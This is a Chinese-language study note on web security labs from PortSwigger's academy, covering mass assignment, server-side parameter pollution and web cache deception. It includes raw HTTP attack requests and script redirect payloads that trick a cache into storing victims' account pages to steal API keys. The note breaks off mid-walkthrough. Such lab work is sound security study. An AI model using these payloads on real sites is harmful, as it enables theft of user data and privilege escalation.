一般批量赋值漏洞从对象字段创建参数，通常可以手动检查 API 返回的对象来识别这些隐藏参数。  

示例，一个 `PATCH /api/users/` 的请求，可以更新用户名和邮箱，包含如下 JSON：

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```

一个并发的 `GET /api/users/123` 请求返回如下 JSON：

```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

这就说明隐藏的 id 和 isAdmin 属性和更新后的 username 、email 一起绑定到内部用户对象上。  



**测试批量赋值漏洞**  

测试是否可以修改枚举出的 isAdmin 参数值，可以尝试 PATCH 请求如下 JSON：

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": false,
}
```

同时发送一个带有无效的 isAdmin 值的 PATCH 请求：

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": "foo",
}
```

观察应用的行为，如果无效值影响了查询逻辑，但是有效值不影响，表明这个参数可以被用户成功更新。  

然后发送一个 isAdmin 值为 true 的 PATCH 类型请求的 JSON：

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true,
}
```

如果请求中的 isAdmin 的值没有被充分验证和净化，用户 wiener 就被错误的授权了管理员权限。  



PortSwigger lab ，购物车结账，根据GET请求的 response，增加 chosen_discount 折扣对应值，获取100%折扣结账：

```http
POST /api/checkout HTTP/2
Host: 0ae000db04ee88ce801a53da00a2000c.web-security-academy.net
Cookie: session=Wj0d7vJ7qkc8YGXzMxSd4b5pWrwj28ae
... omit ...
Content-Length: 155
Content-Type: application/json

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":3,"item_price":133700}]}
```





## 预防 API 漏洞

在开始设计 API 时就考虑相关安全性，一些参考：

* 如果不是对公服务的 API 就要确保文档的安全保密
* 确保 API 文档的实时性，正常测试人员才能比较清晰的了解和测试这些端点的攻击面
* 设置应用允许的 HTTP 方法白名单
* 验证每个请求和响应的上下文类型是否符合预期
* 使用通用的错误消息类型，避免给攻击者泄露过多信息
* 对所有版本的 API 都采取防护，而不仅仅是当前生产上的版本

为了防止批量赋值的漏洞，可以将用户更新的属性例如白名单，将不应由用户更新的属性加入黑名单。  



## 服务端参数污染

一些系统包含无法直接从互联网访问的内部 API。当网站将用户输入嵌入到对内部 API 的服务端请求中而没有充分编码，就会发生服务端参数污染。攻击者可以操纵或者注入参数，实现一些目的，例如：

* 覆盖现有参数
* 修改应用程序行为
* 获取未授权数据

可以测试任何用户输入的入口是否存在参数污染，例如查询、表单、header、URL 路径等都可能会受到攻击。  

有时该漏洞也称为 **HTTP 参数污染**，但是这个词汇有时也代指 WAF 绕过技术，会产生混淆。  



### 测试查询参数

测试查询字符串中的服务端参数污染，可以将 `#`、`&` 和 `=` 等查询语法字符放到输入中，然后观察应用如何响应。  

示例，一个应用提供根据用户名搜索其他用户的功能，浏览器发送如下请求：

```http
GET /userSearch?name=peter&back=/home
```

服务器使用如下请求检索内部 API：

```http
GET /users/search?name=peter&publicProfile=true
```

#### 截断参数

可以使用 URL 编码中的 `#` 字符尝试截取参数，为了帮助解读响应信息，还可以在后面加一些字符串，这里加入 foo，例如：

```http
GET /userSearch?name=peter%23foo&back=/home
```

服务端将尝试访问如下 URL：

```http
GET /users/search?name=peter#foo&publicProfile=true
```

检查响应信息，寻找是否存在被截断的线索。例如返回用户 peter，服务端查询就可能被截断。如果返回 `Invalid name` 之类的报错，应用可能就将 foo 视为了用户名一部分，表明未被截断。  

如果能够截断请求，就会消除请求 URL 后面的 `publicProfile=true` 参数，从而尝试获取内部非公开的用户资料。  



#### 注入无效参数

可以使用 URL 编码的 `&` 字符尝试注入更多参数。  

例如修改请求如下：

```http
GET /userSearch?name=peter%26foo=xyz&back=/home
```

会导致内部服务端请求：

```http
GET /users/search?name=peter&foo=xyz&publicProfile=true
```

如之前一样检查响应信息，尝试寻找影响服务端的线索。  



#### 注入有效参数

如果找到线索能够修改查询字符串，可以尝试注入有效参数。  

例如已经识别出 `email` 参数，就可以添加到查询字符串中：

```http
GET /userSearch?name=peter%26email=foo&back=/home
```

这会导致服务端请求：

```http
GET /users/search?name=peter&email=foo&publicProfile=true
```

然后根据响应继续寻找线索。  



#### 覆盖已存在参数

还可以尝试修改以覆盖现有参数。  

例如，尝试增加一个同名参数：

```http
GET /userSearch?name=peter%26name=carlos&back=/home
```

会导致服务端内部请求：

```http
GET /users/search?name=peter&name=carlos&publicProfile=true
```

内部 API 根据 Web 技术不同而采取不同的行为来处理第二个参数：

- **PHP**：只解析最后一个参数。这将导致搜索用户 `carlos`。
- **ASP.NET**： 合并两个参数。这将导致搜索用户 `peter,carlos`，这可能导致 `Invalid username` 错误消息。
- **Node.js / express**： 只解析第一个参数。这将导致搜索用户 `peter`，给出未改变的结果。



或者可以尝试修改参数 `name=administrator` 查看是否可能以管理员权限访问。  



### 测试 REST 路径

一个 RESTful 类型的 API 更多时候放置参数名和值在 URL path 中，而不是 URL 查询参数的形式，例如：

```http
/api/users/123
```

* /api 是端点
* /users 代表资源，这里是用户
* /123 代表参数，这里指用户id，

设想一个应用允许用户编辑自己的配置信息，通过发送带用户名参数到以下端点：

```http
GET /edit_profile.php?name=peter
```

结果可以通过如下端点查看：

```http
GET /api/private/users/peter
```

攻击者可能会构造一些服务端 URL 参数以利用 API，测试一些漏洞是否存在。  

例如提交一些路径穿越形式的参数，将 `name` 参数赋值一个 `peter/../admin` ：

```http
GET /edit_profile.php?name=peter%2f..%2fadmin
```

查询端点：

```http
GET /api/private/users/peter/../admin
```

通过这种形式从而访问到无法正常访问的端点：

```http
/api/private/users/admin
```







### 测试构造数据格式

一个攻击者可能会基于 JSON 、XML 来构造一些参数请求，测试注入到用户输入请求部分来观察服务器的响应。      

设想一个应用程序允许用户编辑自己的信息，根据用户的输入发送一个如下请求到 API：

```
POST /myaccount name=peter 
```

服务端发送如下 PATCH 请求:

```
PATCH /users/7312/update {"name":"peter"} 
```

这时可以试图插入 `access_level` 参数到请求中:

```
POST /myaccount name=peter","access_level":"administrator
```

如果用户输入到服务端的 JSON 没有充分验证和净化，就会在服务端产生如下请求：

```
PATCH /users/7312/update {"name":"peter","access_level":"administrator"} 
```

这就可能导致 peter 拥有管理员权限。  





设想一个类似的示例，客户端提交的是 JSON 数据：

```
POST /myaccount {"name": "peter"} 
```

服务端发起如下请求：

```
PATCH /users/7312/update {"name":"peter"} 
```

可以尝试通过转义来增加 access_level 参数:

```
POST /myaccount {"name": "peter\",\"access_level\":\"administrator"}
```

如果用户的输入被解码，然后在未充分验证的情况下转发到后端服务器:

```
PATCH /users/7312/update {"name":"peter","access_level":"administrator"}
```

peter 也可以获取到管理员权限。  

结构化数据注入也可能发生在 response 中。如果用户输入被存储在数据库中，在没有充分编码的情况下被嵌入到后端 API 的 JSON  response 中就可能发生这种情况。  






### 自动化测试工具

* **Burp Scanner** ： [Suspicious input transformation](https://portswigger.net/kb/issues/00400d00_suspicious-input-transformation-reflected) 

* **Backslash Powered Scanne**r 插件： [Backslash Powered Scanning: hunting unknown vulnerability classes](https://portswigger.net/research/backslash-powered-scanning-hunting-unknown-vulnerability-classes)  



### 预防服务端参数污染

* 使用白名单定义不需要编码的字符。 
* 确保所有用户输入在充分编码的情况下再被添加到服务端请求。
* 确保所有输入符合预期的格式和结构。





# Web cache deception 缓存欺骗

Web 缓存欺骗是指攻击者能够欺骗缓存存储敏感、动态的上下文。这会导致缓存服务器和源服务器之间处理请求的差异。  

Web 缓存欺骗攻击中，攻击者诱导受害者访问一个恶意 URL，浏览器发出一个访问敏感上下文的模糊请求。这个模糊请求会导致缓存服务器误认为是访问静态资源，存储这个 response 。攻击者再次访问同样的缓存 response，获取到受害者的敏感信息。  



## Web 缓存

Web 缓存系统是位于用户和源站之间，主要用于减轻源站压力而设置的，客户端访问静态资源会先经过缓存。如果缓存中没有包含请求的资源（又称为缓存丢失），缓存服务器转发该请求到源站，并根据预配置的规则集决定是否缓存该 response。  

如果后续有请求访问同样的静态资源，缓存服务器直接返回缓存的 response 给用户（又称为缓存命中）。  

![image-20261117151530960](../upload/2026-07-06-PortSwigger_Server_Side/image-20261117151530960.png)

如今缓存变为普遍且关键的一种手段，尤其是 CDN 的广泛应用，CDN 在距离用户更近的位置分发响应，提升速度，减少数据传输距离。  



### 缓存 key

当缓存接收到一个请求，需要判断是否有缓存内容存在能够直接返回，还是要转发给源站。缓存从 HTTP 请求元素中生成 cache key，通常包含 URL 路径、查询参数，还可以包含各种各样的元素，例如 header、上下文类型等。  

如果进来的请求匹配了之前的请求，缓存就认为请求一致返回缓存的 response。  





### 缓存规则

缓存规则决定缓存内容和时常。缓存规则通常设置为存储那些不会频繁修改的静态资源、页面。动态上下文内容不会缓存，例如包含敏感信息的页面，确保用户可以直接从源站获取最新数据。  

Web 缓存欺骗主要攻击利用缓存规则，因此对不同缓存规则了解是至关重要的，尤其是基于 URL 字符串的匹配规则。例如：  

* 静态文件扩展规则。这些规则匹配扩展名，例如 css、js 等。
* 静态目录规则。这些规则匹配 URL 路径前缀，通常使用一个特定的资源目录，例如 /static、/assets。
* 文件名规则。这些规则匹配特殊文件名到目标文件，通常是很少修改的文件，例如 robots.txt、favicon.ico。

缓存还可能实现一些自定义规则，例如基于 URL 参数、动态分析。  





## 构造攻击

通常构造一个Web 缓存攻击包含如下步骤：

1. 识别返回包含敏感信息动态响应的目标 endpoint ，检查响应信息，寻找渲染页面不可见的敏感信息。重点关注 endpoint 支持的 GET、HEAD、OPTIONS 方法，因为其他 POST、PUT 等修改信息的方法通常不会被缓存。  
2. 识别缓存和源站对 URL 解析的差异，可能导致差异的地方：
   * 映射 URL 到资源
   * 字符分割处理
   * 路径的标准化
3. 构造一个恶意 URL 诱导缓存存储一个动态响应。当一个受害者访问这个 URL，响应被存储到缓存中。再次发送同样的 URL 请求来获取包含受害者敏感信息的数据，避免直接使用浏览器，一些应用会重定向没有对应session或验证数据的请求。  





### 使用缓存破坏器

当测试差异和构造 Web 缓存漏洞利用时，需要确保每个发送的请求使用不同的 key。否则，会命中缓存内容，影响测试结果。  

URL 或者参数中通常包含一些 cache key，可以修改这些 key 来使得每次请求的字符串不同。BurpSuite 中可以使用 cachebuster：click on the top-level **Param miner > Settings** menu, then select **Add dynamic cachebuster**。





### 探测缓存响应

测试期间，关键的是你能够识别出缓存的 response，可以通过观察 header、response 的时间。  

多种 response 的 header 可以表明其被缓存命中，例如：

* `X-Cache` header ：这个 header 提供了 response 是否从缓存中返回，典型的值有
  * `hit`：缓存命中，
  * `miss`：缓存未命中，从源站获取的响应，大多数场景中后续此请求会被缓存，再次请求就会被标记未 hit。
  * `dynamic`：源站动态生成的内容。意味着不适合被缓存。
  * `refresh`：缓存过时，需要刷新。
* `Cache-Control` header：可能包含指示缓存的指令，例如带有  mag-age 值大于 0 的 public 指令。但这仅仅是一个标志，有时缓存机制会覆盖该头部指令。  







## 利用静态扩展缓存规则

缓存规则通常会匹配后缀来缓存静态资源，例如 `.css`、`.js` 等，这是大多数 CDN 默认属性。如果源站和缓存之间存在 URL 资源映射差异，攻击者就能够构造一个让缓存服务器识别到静态标识，而源站忽略该标识的动态请求。  

### 路径映射差异

URL 路径映射混杂了服务器资源文件、脚本、执行命令。不同框架和技术使用不同风格，常见的有传统 URL 映射、RESTful URL 映射。  

传统 URL 映射通常直接映射到本地文件系统路径中。例如：`http://example.com/path/in/filesystem/resource.html` 

- `http://example.com` 指向服务器。
- `/path/in/filesystem/` 代表服务器文件系统中指定的路径。
- `resource.html` 明确要访问的资源文件。

相比之下，REST 风格的 URL 不直接匹配物理文件结构，而是将提取文件路径作为 API 一部分，例如：`http://example.com/path/resource/param1/param2`：

- `http://example.com` 指向服务器。
- `/path/resource/` 代表 endpoint 资源。
- `param1` 和 `param2` 是参数。



缓存服务器和源站的路径映射差异导致了漏洞，例如 `http://example.com/user/123/profile/wcd.css` ：

* 源站使用 REST 风格的 URL 映射，从 `/user/123/profile` 这段 URL 解析返回用户 123 的信息，忽略 `wcd.css` 这个参数。
* 缓存服务器使用传统的 URL 映射，将 `wcd.css`  视为一个静态资源，位于 `/user/123/profile` 路径下，将源站的动态响应缓存为 css 文件的内容。



### 利用路径映射差异

先测试源站如何映射 URL 到资源上，增加任意一段路径到目标 URL endpoint 之后，如果 response 仍然返回相同的数据，就表明源站提取了 URL 中的路径并忽略附加的地址段。例如修改 `/api/orders/123` 为 `/api/orders/123/foo` 仍能返回订单信息。  

再测试缓存服务器如何映射 URL，修改路径尝试增加静态后缀匹配缓存规则，例如更新  `/api/orders/123` 为 `/api/orders/123/foo.js` ，如果响应被缓存，就表明：

* 缓存服务器会解析带静态资源后缀名的全路径。
* 缓存规则中有包含存储 `.js` 结尾为静态资源

缓存可能基于特殊的扩展名，尝试一个较大范围的扩展名，例如 `.css` `.ico`  `.exe `等。  

随后就可以构造一个请求返回被缓存的动态请求响应，不过要注意不同的 endpoint 可能使用不同规则。  



### 分隔符差异

 URL 中不同元素使用分隔符来分隔，字符和字符串的分隔通常是标准化的，例如 `?` 通常用来从 URL 路径中分隔出查询字符串。但是关于 URI 的 RFC 定义很宽松，多种框架和技术实现之间有很多变化。  

源服务器和缓存服务器之间的分隔符解析差异就会导致 Web 缓存欺骗。  

例如`/profile;foo.css`：

- Java Spring 框架使用 `;` 字符作为增加矩阵变量的参数，因此一个使用了 Java Spring 框架的服务器会将 `;` 作为分隔符， 截断 `/profile` 然后返回 profile 信息。
- 大多数其它框架不使用 `;` 作为分隔符， 因此一个不使用 Java Spring 的服务器很可能将 `;` 和之后的内容作为路径的一部分。如果一个缓存规则配置将 `.css` 结尾的作为静态资源缓存，就会导致 profile 信息被缓存为文件。



假设源站使用 Ruby 的 Rails 框架，将 `.` 作为分隔符：

- `/profile` 这个请求会被默认解析为 HTML 格式，返回用户个人信息。 
- `/profile.css` 这个请求会被识别为 CSS 扩展，没有对应格式解析器，因此请求不被接收并返回错误。
- `/profile.ico` 这个请求使用 `.ico` 扩展名，不会被 Rail 处理，默认的 HTML 解析器处理请求并返回用户个人信息。这个场景中，如果规则配置为缓存 `.ico` 格式，就会导致个人信息被缓存为静态资源。

编码字符有时也被用来作为分隔符，例如 `/profile%00foo.js`：

- OpenLiteSpeed 服务使用编码 null 对应的 `%00` 字符作为分隔符。如果源站使用该框架会从 `/profile` 处中断。
- 大多数其它框架遇到 `%00` 会返回错误。但如果缓存使用 Akamai 或者 Fastly，会将 `%00` 及之后的任意内容解释为路径的一部分。





### 利用分隔符差异

首先需要找出源站和缓存之间的分隔符差异，识别出源站不使用而缓存服务器使用的分隔符。  

找出源站使用的分隔符，第一步在 endpoint 后面增加任意字符进行测试，例如，修改 `/settings/users/list` 为 `/settings/users/listaaa`，参考返回的 response。  

下一步增加分隔符在任意字符和原始路径之间，例如 `/settings/users/list;aaa`：

- 如果和原始路径然会同样的 response，就表明 `;` 字符会作为分隔符，路径变为原始的 `/settings/users/list`。
- 如果 response 和带任意字符串的路径相同，表明 `;` 分隔符不会被使用，源站将路径解析为 `/settings/users/list;aaa`。



一旦识别出被源站用作分隔符的字符，测试这个分隔符是否也被缓存服务器使用。可以增加一些静态扩展到末尾，例如 `.js`，如果响应被缓存就表明：

- 缓存不使用这个分隔符中断带有静态文件扩展的 URL 全路径。
- 缓存服务器规则中存在将 `.js` 缓存的设置。

务必测试所有 ASCII 字符和一些常见扩展名，包括 `.css`, `.ico`,  `.exe `等。 常见分隔符： [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)。 可以使用 Burp Intruder 快速测试这些字符。 要防止 Burp Intruder 自动将分隔符编码，在 **Payloads** 侧边栏关闭  **Payload encoding** 功能。



继续构造用来触发缓存欺骗规则的利用，例如一个 payload `/settings/users/list;aaa.js`，源站使用 `;` 作为分隔符:

- 缓存解释路径为： `/settings/users/list;aaa.js`
- 源站解释路径为： `/settings/users/list`

源站服务器返回动态的用户信息就被缓存下来。由于分隔符在每个服务器内部通常是一致的，可以继续在其它 endpoint 中继续利用。  



注：一些分隔符可能会被浏览器编码后发送，意味着不能加以利用，例如 浏览器会以 URL 编码方式处理 `{`, `}`, `<`, `>`， 使用 `#` 缩短路径。如果缓存或者源站解码这些字符，这时可以尝试一些编码版本的 exploit。  





### 分隔符解码差异

网站有时需要发送一些包含在 URL 中但在 URL 编码有特殊含义的符号，例如分隔符，为了确保这些字符被解释为数据处理，通常会被编码。然而一些解析器在处理之前先解码字符，如果编码的分隔符被解码，就会仍然被作为分隔符使用，截断 URL 路径。  

源站和缓存之间对分隔符的解码不同就会导致差异，即使使用同样的字符作为分隔符，例如： `/profile%23wcd.css`，这里使用 URL-encoded 的 `#` 字符：

- 源站服务器解码 `%23` 为 `#`。使用 `#` 作为分隔符，因此解释路径为 `/profile` ，返回个人信息。
- 缓存同样使用 `#` 字符作为分隔符，但是不解码 `%23`，将路径解释为 `/profile%23wcd.css`。如果缓存规则中存在 `.css` 扩展的设置，就会缓存动态数据。

除此之外，一些缓存服务器还会先解码 URL 再转发请求。先应用编码的 URL，然后解码 URL 转发到源站，这种行为也会导致源站和缓存之间解释 URL 路径的差异，例如 `/myaccount%3fwcd.css`：

- 缓存服务器使用基于编码的路径 `/myaccount%3fwcd.css` 匹配缓存规则，决定存储 response 为 `.css` 文件。然后解码 `%3f` 为 `?` 转发到源站。
- 源站服务器接收到请求路径为 `/myaccount?wcd.css`，就使用 `?` 作为分隔符，因此解释路径为 `/myaccount`。



### 利用分隔符解码差异

使用编码后的分隔符加静态扩展后缀给缓存，并让源站看不到这些分隔符之后的扩展。与分隔符差异的方法类似，可以使用 Burp Intruder。还可以测试一些不可打印字符，尤其是 `%00`, `%0A` and `%09`，如果这些字符被解码也会截断 URL 路径。  





## 利用静态目录缓存规则

一些常见的实践中 Web 服务器会将静态资源存储在特定的目录中。缓存规则通常将这些目录匹配到特定的 URL 前缀，例如 `/static`, `/assets`， `/scripts`， `/images`。这些规则也会可能导致 Web 缓存欺骗。	



### 规范化差异

规范化涉及转换多种 URL 路径为标准格式，有时包含解码编码字符和解析点段(dot-segments，例如 ..)，但是在解析器之间存在着多种差异。  

缓存和源站的标准化差异会导致攻击者构造路径穿越 payload 影响不同的解析器，例如  `/static/..%2fprofile`：

- 一个源站服务器解码点段斜杠并规范化路径为 `/profile` ，然后返回 profile 信息。
- 一个缓存服务器不解析点段或者不解码斜杠会将路径解释为 `/static/..%2fprofile`。如果缓存设置了匹配静态目录  `/static` 前缀的规则 ，会导致缓存 profile 信息。

上面的示例中，每个路径穿越中的点段需要被编码，否则受害者的浏览器将在转发请求到缓存服务器之前解析，因此，一个可利用的标准化漏洞需要缓存或源站服务器对路径穿越序列中的字符解码，或者解析点段。



### 探测源服务器规范化

测试源站如何规范化 URL 路径，发送请求到一个不做缓存的资源路径，该资源路径带有从任意目录开始的路径穿越。找那些非幂等的 `POST` 一类的方法，例如修改 `/profile` 为 `/aaa/..%2fprofile`：

- 如果 response 匹配基准 response 并且返回个人资料信息，就表明路径被解释为 `/profile`，源站解码斜杠并解析点段。
- 如果 response 不匹配基准 response，例如返回 `404` ，就表明被解释为 `/aaa/..%2fprofile`。源站服务器也不解码斜杠或者解析点段。



注：当测试规范化，从仅编码点段中第二个斜杠开始。这是因为一些 CDN 会匹配静态资源目录前缀后面的斜杠。还可以尝试编码全部路径穿越的序列，或者编码点来替代斜杠，这样有时会影响解析器是否解码该序列。



### 探测缓存服务器规范化

可以使用一些不同的方法来测试缓存服务器如何规范化路径。从识别潜在的静态资源目录开始。在 **Proxy > HTTP history** 中，可以找静态资源和对应 response。关注状态为 2xx 的静态资源和脚本、图片、CSS 等。  

可以选择被缓存 response 的请求，修改为带有任意路径穿越序列的请求后再次发送。选择被证实缓存的请求，例如 `/aaa/..%2fassets/js/stockCheck.js`：

- 如果 response 不再被缓存，就表明缓存服务器没有再映射到 endpoint 之前做规范化处理，缓存规则基于 `/assets` 前缀。
- 如果 response 仍然被缓存，表明缓存有做规范化处理，路径为 `/assets/js/stockCheck.js`。



还可以增加路径穿越序列到目录前缀之后，例如，修改 `/assets/js/stockCheck.js` 为 `/assets/..%2fjs/stockCheck.js`：

- 如果 response 不再被缓存，就表明缓存服务器做了规范化处理，解码斜杠并且解析点段，解析路径为 `/js/stockCheck.js`。有缓存规则被配置为匹配 `/assets` 前缀。
- 如果 response 仍然被缓存，就表明缓存服务器没有解码斜杠或者解析点段，解析路径为 `/assets/..%2fjs/stockCheck.js`.

还要注意示例中的 response 可能被其它缓存规则影响，例如基于文件扩展名的规则。为了确认是基于静态资源目录的规则，替代匹配的路径前缀之后为任意字符串，例如 `/assets/aaa`。如果 response 仍然被缓存，就能确定缓存规则是基于 `/assets` 前缀。如果 response 看起来似乎未被缓存，并不一定就排除非静态目录前缀缓存规则，有时候 `404` 之类的 responses 不会被缓存。  





### 利用源服务器规范化

如果源站服务器解析编码后的点段，但是缓存服务器不解析，就可以尝试利用这种差异构造一个如下结构的 payload： 

```
/<static-directory-prefix>/..%2f<dynamic-path>
```

假设 payload 为 `/assets/..%2fprofile`：

- 缓存服务器解析路径为 `/assets/..%2fprofile`
- 源站服务器解析路径为 `/profile`

源站返回的 profile 信息会被缓存。  



#### portswigger lab

获取账户信息 URL 为 `GET /my-account`，有一个静态资源 URL 为 `/resources/js/tracking.js`，经过测试符合匹配路径前缀的缓存规则特征，构造如下 payload 发送给受害者：

```html
<script>
    document.location = 'https://0abf004703d87b2980881c140094000e.web-security-academy.net/resources/..%2fmy-account';
</script>
```

日志中出现受害者访问记录后，使用 `GET /resources/..%2fmy-account` 就可以获取到缓存的内容，包含了 API KEY。  







### 利用缓存服务器规范化

如果缓存服务器解析编码后的点段，但是源服务器不解析，就可以尝试利用这种差异构造一个如下结构的 payload： 

```
/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>
```

注：当利用缓存服务器的规范化，对所有路径穿越序列字符做编码，避免非预期的分隔符行为，由于缓存服务器处理解码，不需要未编码的斜杠跟随静态资源前缀。  

这种场景下，仅仅路径穿越不足以利用。例如设想下源站和缓存如何解析此路径： `/profile%2f%2e%2e%2fstatic`

- 缓存解析为 `/static`
- 源站解析为 `/profile%2f%2e%2e%2fstatic`

源站会返回一些错误消息替代个人信息。  



要利用这种差异，还需要识别出源站使用但缓存不使用的分隔符。尽可能在动态请求的 payload 路径后添加分隔符做测试：

- 如果源站使用分隔符，会截断 URL 路径返回动态信息。
- 如果缓存不使用分隔符，会解析路径并缓存 response。

例如，payload `/profile;%2f%2e%2e%2fstatic`，源站使用 `;` 作为分隔符：

- 缓存解析为 `/static`
- 源站解析为 `/profile`

源站返回的动态数据被缓存，因此该 payload 就可以利用。  



#### portswigger lab

将 `/my-account` 这个动态 endpoint 和静态资源 `/resources/js/tracking.js` 组合，测试出源站和缓存之间的分隔符差异：  

通过如下两次请求相同判断缓存服务器做了规范化：

```http
GET /resources/js/tracking.js HTTP/2
Host: 0a8f000004398a1c80ee8a8700ef00aa.web-security-academy.net


GET /aaa/..%2fresources/js/tracking.js HTTP/2
Host: 0a8f000004398a1c80ee8a8700ef00aa.web-security-academy.net

```

再通过如下请求判断源站是否规范化，返回 404 说明源站未做规范化：

```http
GET /aaa/..%2fmy-account HTTP/2
Host: 0a8f000004398a1c80ee8a8700ef00aa.web-security-academy.net
Cookie: session=s7FbAEuBPnt1KvVdbw4nxSU9tmstYsTc
Cache-Control: max-age=0
...omit...

```

再尝试分隔符，将如下请求发送到 Intruder 中，这里分别在P1、P2处分别使用了分隔符清单、数字自增的 Payload，P2处主要是为了避免前面请求缓存404影响后面的结果：

```http
GET /my-accountP1%2f%2e%2e%2fresources/js/trackingP2.js HTTP/2
Host: 0a8f000004398a1c80ee8a8700ef00aa.web-security-academy.net
Cookie: session=s7FbAEuBPnt1KvVdbw4nxSU9tmstYsTc
... omit ...


```

测试出使用 `?`、 `#` 分隔符返回 200，但是 `?` 会被视作动态请求，因此这里使用 `#`：

```http
GET /my-account%23%2f%2e%2e%2fresources/js/tracking.js HTTP/2
Host: 0a8f000004398a1c80ee8a8700ef00aa.web-security-academy.net
Cookie: session=s7FbAEuBPnt1KvVdbw4nxSU9tmstYsTc
Cache-Control: max-age=0
...omit...


```

response 会被缓存到上面的 js 中：

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 4
X-Cache: hit
Content-Length: 3970
```



因此构造如下 html 给 exploit 的受害者：

```html
<script>
    document.location = 'https://0a8f000004398a1c80ee8a8700ef00aa.web-security-academy.net/my-account%23%2f%2e%2e%2fresources/js/carlos.js';
</script>
```

访问资源：

```http
GET /resources/js/carlos.js HTTP/2
Host: 0a8f000004398a1c80ee8a8700ef00aa.web-security-academy.net
```

获取到对应 API KEY：

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 30
X-Cache: hit
Content-Length: 3970

... omit ...
                   <div id=account-content>
                        <p>Your username is: carlos</p>
                        <div>Your API Key is: MNcQazB6SIyHjYRUnOMWA7WSEAnXW7NB</div><br/>
                        
... omit ...
```







## 利用文件名缓存规则

确认服务器存在 `robots.txt`, `index.html`,  `favicon.ico` 这类型的文件，这些通常被缓存且很少修改。缓存规则经常会对这些文件名称做精确字符串匹配。为了识别文件名缓存规则存在，对可能存在的文件发送一个 `GET` 请求观察 response 被缓存。  



### 探测规范化差异

同前面的方法类似，先测试源服务器、缓存服务器是否规范化 URL 路径。  

这里用 `/profile%2f%2e%2e%2findex.html` 示例：

- response 被缓存，说明缓存服务器规范化了路径为 `/index.html`。
- response 未被缓存，表明缓存服务器未解码斜杠或者未解析点段，解释路径为 `/profile%2f%2e%2e%2findex.html`。



### 利用规范化差异

由于 response 仅仅缓存匹配到特定文件名的请求，因此只能在缓存服务器规范化，但源服务器不规范化时进行利用。使用和静态文件目录缓存规则类似的方法，简单将示例中静态目录前缀替换为对应特定文件名。   





#### portswigger lab

需要找到漏洞修改管理员邮箱，用到 CSRF 相关内容。  

lab 存在 robots.txt：

```http
GET /robots.txt HTTP/2
Host: 0aa4002e0308a5e1809a35d500af0005.web-security-academy.net


```

response 如下：

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Set-Cookie: session=JRxLbJDGpEzNE52TCGbzcPu9B8JhtUeg; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Server: Apache-Coyote/1.1
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 25

User-agent: *
Disallow: 

```

获取个人主页请求如下：

```http
GET /my-account HTTP/2
Host: 0aa4002e0308a5e1809a35d500af0005.web-security-academy.net
Cookie: session=r9kPbaqLh8tIM9YI124duczgUM14eMY0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
... omit ...


```

response 如下，包含了修改邮箱相关表单，其中有 csrf 值、`/resources/js/validateSession.js` 验证 session 的 js 文件：

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Server: Apache-Coyote/1.1
Content-Length: 3862

<!DOCTYPE html>
<html>

... omit ...
                    <div id=account-content>
                        <p>Your username is: wiener</p>
                        <p>Your email is: <span id="user-email">wiener@pet.err</span></p>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="YMGP43ydPBGE7wgLSBngiS7P7Omf0IFs">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                        <script src='/resources/js/validateSession.js'></script>
                        <script>validateSession("/login")</script>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

测试动态请求 + robots.txt 返回的 404 会被缓存，说明可以被利用：

```http
GET /my-account%2f%2e%2e%2frobots.txt HTTP/2
Host: 0aa4002e0308a5e1809a35d500af0005.web-security-academy.net
Cookie: session=r9kPbaqLh8tIM9YI124duczgUM14eMY0
... omit ...
```

response 如下：

```http
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Server: Apache-Coyote/1.1
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 11

"Not Found"
```

再次请求 robots.txt：

```http
GET /robots.txt HTTP/2
Host: 0aa4002e0308a5e1809a35d500af0005.web-security-academy.net


```

response 如下：

```http
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Server: Apache-Coyote/1.1
Cache-Control: max-age=30
Age: 15
X-Cache: hit
Content-Length: 11

"Not Found"
```

说明缓存已经被源站动态请求 response 影响。  

现在需要找到可以利用的分隔符，避免404被缓存，测试分隔符 Payload 如下，添加到 P1 位置：

```http
GET /my-accountP1aaa HTTP/2
Host: 0aa4002e0308a5e1809a35d500af0005.web-security-academy.net
Cookie: session=r9kPbaqLh8tIM9YI124duczgUM14eMY0
```

经过 Intruder 测试 `;` 可以分隔（URL 编码后的 `%3B` 不可以），使用 wiener 账号验证确实可以缓存到 robots.txt 的 URL 中。  

等待缓存过期（大约30s），构造如下 payload 发给受害者：

```html
<script>
    document.location = 'https://0aa4002e0308a5e1809a35d500af0005.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt';
</script>
```

再次访问 robots.txt 能够获取到 administrator 的页面数据：

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Server: Apache-Coyote/1.1
Cache-Control: max-age=30
Age: 12
X-Cache: hit
Content-Length: 3779

<!DOCTYPE html>
<html>
... omit ..
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: administrator</p>
